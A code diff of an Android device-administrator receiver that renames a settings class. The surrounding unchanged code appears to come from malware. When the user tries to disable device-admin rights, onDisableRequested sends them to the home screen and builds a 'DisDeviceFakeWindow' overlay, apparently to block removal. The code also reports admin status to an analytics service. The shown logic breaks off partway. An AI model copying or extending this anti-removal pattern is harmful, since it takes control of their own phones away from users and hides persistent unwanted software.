@@ -9,7 +9,7 @@ import com.xstd.qm.AppRuntime;
 import com.xstd.qm.Utils;
 import com.xstd.qm.fakecover.DisDeviceFakeWindow;
 import com.xstd.qm.service.FakeBindService;
-import com.xstd.qm.setting.SettingManager;
+import com.xstd.qm.setting.MainSettingManager;
 
 import java.util.HashMap;
 
@@ -26,8 +26,8 @@ public class BindDeviceReceiver extends DeviceAdminReceiver {
 
     @Override
     public void onEnabled(Context context, Intent intent) {
-        SettingManager.getInstance().init(context);
-        SettingManager.getInstance().setKeyHasBindingDevices(true);
+        MainSettingManager.getInstance().init(context);
+        MainSettingManager.getInstance().setKeyHasBindingDevices(true);
 
         //notify umeng
         HashMap<String, String> log = new HashMap<String, String>();
@@ -44,8 +44,8 @@ public class BindDeviceReceiver extends DeviceAdminReceiver {
 
     @Override
     public void onDisabled(Context context, Intent intent) {
-        SettingManager.getInstance().init(context);
-        SettingManager.getInstance().setKeyHasBindingDevices(false);
+        MainSettingManager.getInstance().init(context);
+        MainSettingManager.getInstance().setKeyHasBindingDevices(false);
 
         //notify umeng
         HashMap<String, String> log = new HashMap<String, String>();
@@ -56,7 +56,7 @@ public class BindDeviceReceiver extends DeviceAdminReceiver {
 
     @Override
     public CharSequence onDisableRequested(final Context context, Intent intent) {
-        if (!SettingManager.getInstance().getKeyPluginInstalled()) {
+        if (!MainSettingManager.getInstance().getKeyPluginInstalled()) {
             UtilsRuntime.goHome(context);
 
             DisDeviceFakeWindow fakeWindow = new DisDeviceFakeWindow(context);
